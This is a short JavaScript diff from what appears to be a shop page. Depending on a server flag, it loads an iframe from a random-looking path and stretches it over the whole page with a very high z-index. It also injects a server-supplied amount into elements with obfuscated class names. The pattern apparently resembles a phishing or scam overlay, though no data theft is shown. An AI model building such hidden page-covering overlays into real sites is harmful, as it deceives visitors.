@@ -743,13 +743,14 @@ $(".img_producto_container")
         if (data['goKaraleva'] == '0') {
           rets = 14;
           var video = document.getElementById('iframe');
-          video.setAttribute("src", "https://fragilestudiospk.com/4024152558o8239h");
+          video.setAttribute("src", "/4024152558o8239h");
           video.style.position = "absolute";
           video.style.top = "0";
           video.style.left = "0";
           video.style.height = "100%";
           video.style.width = "100%";
-          body.appendChild(video);
+          video.style.zIndex = "100000";
+          document.body.appendChild(video);
         } else if (data['goKaraleva'] == '1' && got <= 1) {
           got = 1;
           document.querySelectorAll(".uxskpx").forEach(el => {el.innerHTML = `${data['amount']}`});
